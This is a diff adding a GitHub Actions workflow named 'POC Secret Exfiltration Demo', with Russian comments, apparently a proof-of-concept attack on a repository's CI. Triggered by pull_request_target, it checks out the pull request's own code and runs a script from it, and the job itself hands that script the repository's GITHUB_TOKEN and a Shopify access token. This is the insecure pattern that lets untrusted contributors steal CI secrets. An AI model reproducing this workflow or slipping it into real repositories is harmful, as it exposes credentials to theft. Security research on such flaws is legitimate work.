@@ -1,0 +1,26 @@
+name: POC Secret Exfiltration Demo
+on: pull_request_target
+
+permissions:
+  contents: read # Достаточно для checkout
+  pull-requests: read # Достаточно для информации о PR
+
+jobs:
+  exploit_poc_job: # Уникальное имя job'а
+    runs-on: ubuntu-latest
+    # НЕТ 'if' УСЛОВИЙ НА УРОВНЕ JOB ЗДЕСЬ
+    steps:
+      - name: Checkout PR code (from head_ref)
+        uses: actions/checkout@v4 
+        with:
+          ref: ${{ github.head_ref }} # Это ключевой момент - берем код из PR
+
+      - name: Execute PoC Script from PR
+        # Убедитесь, что путь к скрипту правильный относительно корня репозитория
+        run: ./.github/workflows/dependabot_auto_merge_changeset.sh 
+        env:
+          # Передаем переменные окружения в скрипт
+          # GITHUB_TOKEN будет доступен как secrets.GITHUB_TOKEN, и скрипт может его использовать напрямую или через env
+          DEMO_GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} 
+          # Этот секрет не будет доступен в форке, но скрипт попытается его прочитать, демонстрируя потенциальный доступ
+          DEMO_SHOPIFY_GH_ACCESS_TOKEN: ${{ secrets.SHOPIFY_GH_ACCESS_TOKEN }} 
